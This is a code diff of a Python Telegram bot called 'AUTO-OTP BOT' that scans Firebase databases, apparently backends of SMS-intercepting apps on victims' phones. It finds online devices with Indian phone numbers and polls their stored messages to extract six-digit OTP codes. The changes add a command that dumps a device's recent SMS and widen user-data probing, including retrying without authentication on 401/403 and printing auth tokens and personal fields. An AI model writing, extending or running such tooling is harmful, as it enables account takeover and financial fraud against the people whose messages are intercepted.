@@ -1,6 +1,6 @@
 """
 ╔══════════════════════════════════════════════════╗
-║          AUTO-OTP BOT v1.4                       ║
+║          AUTO-OTP BOT v1.5                       ║
 ║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
 ╚══════════════════════════════════════════════════╝
 
@@ -11,8 +11,9 @@ Commands:
   /removefire all         - Remove all Firebase DBs
   /listfire               - List all added Firebase DBs with status
   /scan                   - Scan all DBs and show online devices
-  /debugscan              - Deep debug scan (shows DB shape & field names)
-  /debugusers             - Inspect user/phone paths in the DB
+  /debugscan              - Deep debug scan (clients + top-level keys)
+  /debugusers             - Deep inspect user/phone paths
+  /debugmsgs <deviceId>   - Show last messages for one device
   /auto [count]           - Start auto-OTP for N numbers (default 5)
   /stopauto               - Stop running auto-OTP
   /resetused              - Reset used numbers list
@@ -35,7 +36,6 @@ import logging
 import threading
 import random
 from io import BytesIO
-from concurrent.futures import ThreadPoolExecutor, as_completed
 
 if sys.platform == "win32":
     sys.stdout.reconfigure(encoding="utf-8", errors="replace")
@@ -57,39 +57,26 @@ logger = logging.getLogger("AutoOTP")
 def load_proxies():
     global PROXY_POOL
     PROXY_POOL = []
-
     here = os.path.dirname(os.path.abspath(__file__))
     cwd  = os.getcwd()
-
-    candidates = [
-        PROXY_FILE,
-        os.path.join(here, PROXY_FILE),
-        os.path.join(cwd, PROXY_FILE),
-        "/app/proxies.txt",
-    ]
+    candidates = [PROXY_FILE, os.path.join(here, PROXY_FILE),
+                  os.path.join(cwd, PROXY_FILE), "/app/proxies.txt"]
     found_path = None
     for p in candidates:
         if os.path.exists(p):
-            found_path = p
-            break
-
+            found_path = p; break
     if not found_path:
         logger.warning(f"[PROXY] not found. cwd={cwd}")
         return
-
     logger.info(f"[PROXY] using {found_path} ({os.path.getsize(found_path)} bytes)")
-
     try:
         with open(found_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
             content = f.read()
     except Exception as e:
-        logger.error(f"[PROXY] read error: {e}")
-        return
-
+        logger.error(f"[PROXY] read error: {e}"); return
     for i, raw in enumerate(content.splitlines(), 1):
         line = raw.strip().strip('\ufeff')
-        if not line or line.startswith('#'):
-            continue
+        if not line or line.startswith('#'): continue
         proxy = None
         if '://' in line:
             proxy = line
@@ -103,11 +90,9 @@ def load_proxies():
                 host, port, user, pwd = parts
                 proxy = f"http://{user}:{pwd}@{host}:{port}"
             else:
-                logger.warning(f"[PROXY] line {i}: invalid ({len(parts)} parts)")
-                continue
+                logger.warning(f"[PROXY] line {i}: invalid ({len(parts)} parts)"); continue
         PROXY_POOL.append(proxy)
         logger.info(f"[PROXY] line {i}: ✅ ...@{proxy.split('@')[-1]}")
-
     logger.info(f"[PROXY] === loaded {len(PROXY_POOL)} proxies ===")
 
 
@@ -340,72 +325,103 @@ def _extract_phone(dd):
                 return str(v).strip()
     return None
 
+def fb_fetch_users(url, auth):
+    """Try to load a phone-bearing node."""
+    for path in ["users","user_data","All_User","All_Users","registeredDevices","Verify_Device","devices"]:
+        try:
+            r = requests.get(f"{url}/{path}.json?auth={auth}", timeout=10)
+            if r.status_code == 200:
+                j = r.json()
+                if isinstance(j, dict) and j:
+                    # Heuristic: does it contain a phone-like value?
+                    for k, v in list(j.items())[:5]:
+                        if isinstance(v, dict):
+                            for fk, fv in v.items():
+                                kl = fk.lower()
+                                if any(x in kl for x in ['phone','mob','number','sim','msisdn']):
+                                    if str(fv).strip():
+                                        return path, j
+                        # Or key itself is a phone
+                        if re.match(r'^\d{10,}$', str(k)):
+                            return path, j
+        except: continue
+    return None, {}
+
 def fb_scan():
     devs = []
     with firebase_lock: dbs = list(firebase_dbs)
     for db in dbs:
-        data = None
-        for path in ["clients","devices","users","data","nodes","allClients"]:
-            try:
-                r = requests.get(f"{db['url']}/{path}.json?auth={db['auth']}", timeout=8)
-                if r.status_code == 200:
-                    j = r.json()
-                    if j and (isinstance(j, dict) and len(j) > 0):
-                        data = j
-                        break
-            except: continue
-        if not data: continue
+        url = db['url'].rstrip('/'); auth = db['auth']
 
-        if isinstance(data, dict):
-            iterable = data.items()
-        elif isinstance(data, list):
-            iterable = [(str(i), d) for i, d in enumerate(data)]
-        else:
-            continue
+        # Load clients
+        clients = {}
+        try:
+            r = requests.get(f"{url}/clients.json?auth={auth}", timeout=10)
+            if r.status_code == 200 and isinstance(r.json(), dict):
+                clients = r.json()
+        except: continue
+        if not clients: continue
 
-        for did, dd in iterable:
+        # Load users (phone map)
+        upath, users = fb_fetch_users(url, auth)
+        logger.info(f"[SCAN] {url.split('//')[-1][:40]} users_path={upath} users={len(users)}")
+
+        for did, dd in clients.items():
             if not isinstance(dd, dict): continue
             if not _is_online(dd): continue
-            ph = _extract_phone(dd)
+
+            ph = _extract_phone(dd)  # maybe phone is in clients after all
+
+            if not ph and isinstance(users, dict):
+                # Case A: users keyed by deviceId
+                u = users.get(did)
+                if isinstance(u, dict):
+                    ph = _extract_phone(u)
+                # Case B: users keyed by phone → find key whose value.deviceId == did
+                if not ph:
+                    for k, v in users.items():
+                        if isinstance(v, dict):
+                            if str(v.get("deviceId","")).strip() == did or str(v.get("device_id","")).strip() == did:
+                                if re.match(r'^\d{10,}$', str(k).strip()):
+                                    ph = str(k).strip()
+                                else:
+                                    ph = _extract_phone(v)
+                                break
+
             if not ph: continue
-            dg = re.sub(r'[^0-9]','',ph)
+            dg = re.sub(r'[^0-9]','',str(ph))
             if len(dg) >= 10:
                 cl = dg[-10:]
                 if re.match(r'^[6-9]\d{9}$', cl):
                     with used_lock:
                         if cl not in used_numbers:
                             devs.append({
-                                "db_url":db["url"], "db_auth":db["auth"],
-                                "dev_id":did, "phone":cl, "phone_display":ph,
-                                "battery":str(dd.get("battery","?"))[:6]
+                                "db_url": url, "db_auth": auth,
+                                "dev_id": did, "phone": cl, "phone_display": str(ph).strip(),
+                                "battery": str(dd.get("battery","?"))[:6]
                             })
     return devs
 
 def fb_msgids(url,auth,did):
-    for path in ["messages","sms","msg","notifications"]:
-        try:
-            r=requests.get(f"{url}/{path}/{did}.json?auth={auth}&shallow=true",timeout=8)
-            if r.status_code==200 and r.json(): return set(r.json().keys())
-        except: pass
+    r = requests.get(f"{url}/messages/{did}.json?auth={auth}&shallow=true", timeout=8)
+    if r.status_code == 200 and r.json(): return set(r.json().keys())
     return set()
 
 def fb_otp(url,auth,did,existing,timeout=120):
     t0=time.time()
-    paths = ["messages","sms","msg","notifications"]
     while time.time()-t0<timeout:
-        for path in paths:
-            try:
-                r=requests.get(f"{url}/{path}/{did}.json?auth={auth}&orderBy=%22%24key%22&limitToLast=20",timeout=8)
-                if r.status_code==200 and r.json():
-                    ms=r.json()
-                    if isinstance(ms,dict):
-                        for mid,md in sorted(ms.items(),reverse=True):
-                            if mid in existing: continue
-                            if not isinstance(md,dict): continue
-                            body=str(md.get("message","") or md.get("body","") or md.get("msg","") or md.get("text","") or "")
-                            for o in re.findall(r'\b(\d{6})\b',body):
-                                if o not in ["000000","123456","111111","999999"]: return o
-            except: pass
+        try:
+            r=requests.get(f"{url}/messages/{did}.json?auth={auth}&orderBy=%22%24key%22&limitToLast=20",timeout=8)
+            if r.status_code==200 and r.json():
+                ms=r.json()
+                if isinstance(ms,dict):
+                    for mid,md in sorted(ms.items(),reverse=True):
+                        if mid in existing: continue
+                        if not isinstance(md,dict): continue
+                        body=str(md.get("message","") or md.get("body","") or md.get("msg","") or md.get("text","") or "")
+                        for o in re.findall(r'\b(\d{6})\b',body):
+                            if o not in ["000000","123456","111111","999999"]: return o
+        except: pass
         time.sleep(3)
     return None
 
@@ -421,7 +437,7 @@ def auto_worker(cid, count):
     send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 🚀 AUTO-OTP Started 〕</b>\n\n◈  Target · {count} PDFs\n◈  Firebase · {dbc} DBs\n◈  Proxies · {len(PROXY_POOL)}\n<i>◌  Scanning...</i>")
     devs=fb_scan()
     if not devs:
-        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No online devices.\n\n<i>Run /debugscan and /debugusers to inspect DBs.</i>")
+        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No online devices.\n\n<i>Run /debugscan and /debugusers.</i>")
         auto_running.pop(cid,None); return
 
     send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 {len(devs)} Devices</b>\n◈  Processing {min(count,len(devs))}...\n<i>◌  Running...</i>")
@@ -540,8 +556,9 @@ def handle(cid, text):
             f"  /listfire\n\n"
             f"📱 <b>Auto-OTP:</b>\n"
             f"  /scan — Online devices\n"
-            f"  /debugscan — Deep DB inspection\n"
-            f"  /debugusers — Inspect user/phone paths\n"
+            f"  /debugscan — Inspect /clients + top keys\n"
+            f"  /debugusers — Inspect /users & phone paths\n"
+            f"  /debugmsgs <code>&lt;deviceId&gt;</code> — Show messages\n"
             f"  /auto [N] — Process N numbers\n"
             f"  /stopauto\n"
             f"  /resetused\n\n"
@@ -639,7 +656,7 @@ def handle(cid, text):
         send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Scanning...</i>")
         devs=fb_scan()
         if not devs:
-            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.\n\n<i>Run /debugscan and /debugusers to see why.</i>")
+            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.\n\n<i>Run /debugscan and /debugusers.</i>")
             return
         ls=[f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 Online Devices</b>\n"]
         for i,d in enumerate(devs[:50],1):
@@ -656,7 +673,7 @@ def handle(cid, text):
         report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔍 Debug Scan</b>"]
 
         for db in dbs:
-            url = db['url']; auth = db['auth']
+            url = db['url'].rstrip('/'); auth = db['auth']
             short = url.split('//')[-1].split('-default')[0][:40]
             report.append(f"\n<b>DB:</b> <code>{short}</code>")
             report.append(f"◈ auth: <code>{auth[:15]}</code>")
@@ -710,51 +727,89 @@ def handle(cid, text):
             send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs added.")
             return
 
-        report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔎 User Paths</b>"]
+        report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔎 User Paths (v2)</b>"]
 
         for db in dbs[:1]:
-            url = db['url']; auth = db['auth']
-            report.append(f"\n<b>DB:</b> <code>{url.split('//')[-1][:40]}</code>")
+            url = db['url'].rstrip('/'); auth = db['auth']
+            report.append(f"\n<b>DB:</b> <code>{url.split('//')[-1][:45]}</code>")
+            report.append(f"◈ auth: <code>{auth}</code>")
 
-            # sample client ids
-            try:
-                r = requests.get(f"{url}/clients.json?auth={auth}&shallow=true", timeout=10)
-                if r.status_code == 200 and isinstance(r.json(), dict):
-                    ids = list(r.json().keys())[:3]
-                    report.append(f"◈ sample client ids: <code>{', '.join(ids)}</code>")
-            except Exception as e:
-                report.append(f"◈ clients err: {str(e)[:80]}")
-
-            for path in ["users","All_User","All_Users","user_data","registeredDevices","Verify_Device","devices","panel"]:
+            for path in ["users","user_data","All_User","All_Users",
+                         "registeredDevices","Verify_Device","devices",
+                         "panel","bot_users","bookings","profex_incoming",
+                         "callForwarding","settings"]:
                 try:
-                    r = requests.get(f"{url}/{path}.json?auth={auth}&limitToFirst=3", timeout=10)
-                    if r.status_code != 200:
-                        report.append(f"◈ /{path} → HTTP {r.status_code}")
+                    r = requests.get(f"{url}/{path}.json?auth={auth}", timeout=12)
+                    code = r.status_code
+                    if code in (401, 403):
+                        r = requests.get(f"{url}/{path}.json", timeout=12)
+                        code = r.status_code
+                    if code != 200:
+                        report.append(f"◈ /{path} → HTTP {code}")
                         continue
+
                     j = r.json()
                     if not j:
                         report.append(f"◈ /{path} → empty")
                         continue
-                    report.append(f"\n<b>/{path}</b> ({type(j).__name__})")
+
+                    kind = type(j).__name__
+                    report.append(f"\n<b>/{path}</b> ({kind})")
+
                     if isinstance(j, dict):
-                        for i, (k, v) in enumerate(list(j.items())[:3], 1):
-                            report.append(f"  {i}. key=<code>{k[:20]}</code>")
+                        keys = list(j.keys())
+                        report.append(f"  total keys: <b>{len(keys)}</b>")
+                        for i, k in enumerate(keys[:2], 1):
+                            v = j[k]
+                            report.append(f"  {i}. key=<code>{str(k)[:26]}</code>")
                             if isinstance(v, dict):
-                                report.append(f"     fields: {', '.join(list(v.keys())[:15])}")
-                                for fk in list(v.keys())[:15]:
+                                flds = list(v.keys())[:10]
+                                report.append(f"     fields: {', '.join(flds)}")
+                                for fk in flds:
                                     fv = v.get(fk)
-                                    if any(x in fk.lower() for x in ['phone','mob','num','sim','msisdn','contact','eid','aadhaar','uid']):
-                                        report.append(f"     ↳ {fk} = <code>{str(fv)[:40]}</code>")
+                                    kl = fk.lower()
+                                    if any(x in kl for x in ['phone','mob','num','sim','msisdn',
+                                                             'contact','name','eid','uid']):
+                                        report.append(f"     ↳ {fk} = <code>{str(fv)[:45]}</code>")
                             else:
                                 report.append(f"     value: <code>{str(v)[:60]}</code>")
                     elif isinstance(j, list):
-                        report.append(f"  list[{len(j)}], first item keys: {list(j[0].keys())[:12] if j and isinstance(j[0], dict) else 'n/a'}")
+                        report.append(f"  list[{len(j)}]")
+                        if j and isinstance(j[0], dict):
+                            report.append(f"  item[0] keys: {', '.join(list(j[0].keys())[:10])}")
+
                 except Exception as e:
                     report.append(f"◈ /{path} err: {str(e)[:80]}")
 
         full = "\n".join(report)
         for i in range(0, len(full), 3800):
             send_msg(cid, full[i:i+3800])
+
+    elif cmd=='/debugmsgs':
+        if len(parts)<2:
+            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage: <code>/debugmsgs &lt;deviceId&gt;</code>"); return
+        did = parts[1].strip()
+        with firebase_lock: dbs = list(firebase_dbs)
+        if not dbs:
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs."); return
+        url = dbs[0]['url'].rstrip('/'); auth = dbs[0]['auth']
+
+        try:
+            r = requests.get(f"{url}/messages/{did}.json?auth={auth}&orderBy=%22%24key%22&limitToLast=10", timeout=12)
+            if r.status_code != 200:
+                send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ HTTP {r.status_code}"); return
+            j = r.json()
+            if not j:
+                send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ empty"); return
+            lines = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📩 last 10 for {did[:14]}</b>\n"]
+            for mid, md in sorted(j.items(), reverse=True)[:10]:
+                if isinstance(md, dict):
+                    body = md.get("message","") or md.get("body","") or md.get("msg","")
+                    sender = md.get("sender","")
+                    lines.append(f"• <b>{sender[:20]}</b>\n  <code>{str(body)[:180]}</code>")
+            send_msg(cid, "\n".join(lines))
+        except Exception as e:
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ {str(e)[:120]}")
 
     elif cmd=='/auto':
         cnt=5
